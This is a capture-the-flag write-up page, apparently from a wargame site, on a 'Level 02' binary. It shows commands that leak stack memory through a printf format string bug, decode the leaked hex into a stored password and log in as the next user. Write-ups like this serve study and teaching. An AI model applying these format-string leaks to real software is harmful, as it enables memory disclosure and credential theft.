---
sidebar_position: 4
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 💣 Level 02

<MissionObjective 
  level="Level 02"
  target="Password extraction"
  method="Format string vulnerability exploitation"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Format String Vulnerability"
  severity="high"
  description="The program uses printf(buffer) instead of printf('%s', buffer), allowing attackers to read arbitrary memory locations through format specifiers like %p, %x, and %s."
  techniques={[
    "Memory Disclosure",
    "Stack Dumping", 
    "Format String Exploitation"
  ]}
/>

## Initial Program Analysis

<CodeBlock 
  title="Program Execution"
  command="./level02"
  output={`===== [ Secure Access System v1.0 ] =====
/***************************************\\
| You must login to access this system. |
\\**************************************/
--[ Username: test
--[ Password: test
test does not have access!`}
/>

**Key Observations:**
- Program prompts for username and password
- Rejects all login attempts with "does not have access!" message
- Uses a secure access system interface

## Debugging Challenges

<CodeBlock 
  title="GDB Analysis Attempt"
  command="gdb ./level02"
  output={`(gdb) run
ERROR: failed to open password file`}
/>

**Critical Discovery:** The binary detects debugger environment and refuses to open the password file, making direct memory inspection impossible.

## Static Analysis Findings

<CodeBlock 
  title="Disassembly Analysis"
  command="(gdb) disas main"
  output={`Key findings from disassembly:
- fopen() reads password from file
- fread() loads password into stack buffer  
- printf(buffer) - VULNERABLE FORMAT STRING
- strncmp() compares user input to password`}
/>

## Format String Vulnerability Discovery

<CodeBlock 
  title="Testing Format String"
  command='echo "%x %x %x %x" | ./level02'
  output={`===== [ Secure Access System v1.0 ] =====
/***************************************\\
| You must login to access this system. |
\\**************************************/
--[ Username: %x %x %x %x
--[ Password: 
7fffffffe4d0 f7ff0000 0 7fffffffe5d8 does not have access!`}
/>

**Vulnerability Confirmed:** The program outputs raw hex values from memory!

## Password Extraction Process

<StepsList steps={[
  {
    title: "Stack Position Enumeration",
    description: "Use format string to leak different stack positions systematically",
    command: 'for i in {1..50}; do echo "$i - %$i\\$p" | ./level02 | grep does; done',
    output: "Scanning stack positions 1-50 for password data..."
  },
  {
    title: "Identify Password Locations",
    description: "Find hex values that look like ASCII password chunks",
    command: "Key findings at specific positions:",
    output: `22 - 0x756e505234376848 does not have access!
23 - 0x45414a3561733951 does not have access!
24 - 0x377a7143574e6758 does not have access!
25 - 0x354a35686e475873 does not have access!
26 - 0x48336750664b394d does not have access!`
  },
  {
    title: "Convert Little-Endian Hex to ASCII",
    description: "Decode each hex value accounting for little-endian byte order",
    command: "Hex to ASCII conversion process:",
    output: `echo 756e505234376848 | sed 's/../& /g' | tac -rs ' ' | tr -d '\\n ' | xxd -r -p
# Result: HhH7R4Pnu

Repeat for each hex value to get password chunks`
  },
  {
    title: "Reconstruct Complete Password",
    description: "Combine all decoded chunks in correct order",
    command: "Final password assembly",
    output: "Complete password: [decoded_password_string]"
  },
  {
    title: "Successful Authentication",
    description: "Use extracted password to gain access",
    command: "./level02",
    output: `===== [ Secure Access System v1.0 ] =====
--[ Username: level03
--[ Password: [extracted_password]
Greetings, level03!
$ whoami
level03`
  }
]} />

## Technical Breakdown

<CodeBlock 
  title="Hex Decoding Process"
  command="# Step-by-step hex to ASCII conversion"
  output={`1. Split hex into byte pairs: 75 6e 50 52 34 37 68 48
2. Reverse byte order (little-endian): 48 68 37 34 52 50 6e 75  
3. Convert to ASCII: HhH7R4Pnu
4. Repeat for all password chunks
5. Concatenate results in stack order`}
/>

## Format String Exploitation Summary

<CodeBlock 
  title="Exploitation Methodology"
  command="# Format string vulnerability breakdown"
  output={`Vulnerable code: printf(buffer);
Safe code:       printf("%s", buffer);

Exploitation technique:
- %p: Print pointer values from stack
- %n$p: Print nth argument from stack  
- Stack contains password loaded by fread()
- Memory layout reveals password in chunks`}
/>

## Key Takeaways

- **Format string vulnerabilities** allow reading arbitrary memory through printf format specifiers
- **Anti-debugging techniques** can prevent dynamic analysis, requiring creative approaches
- **Little-endian encoding** must be considered when extracting multi-byte values
- **Stack layout understanding** is crucial for systematic memory disclosure
- **Automated scanning** with loops can efficiently map memory contents

**Tools used:** `printf format strings`, `bash loops`, `sed`, `xxd`, `tac`, static analysis

:::warning Anti-Debugging Protection
This binary demonstrates how programs can detect debugging environments and alter behavior. Always consider both dynamic and static analysis approaches.
:::

:::tip Format String Exploitation
The key insight is that printf(user_input) treats the input as a format string, allowing %p and %x specifiers to read memory. Position-specific format like %22$p targets exact stack locations.
::: 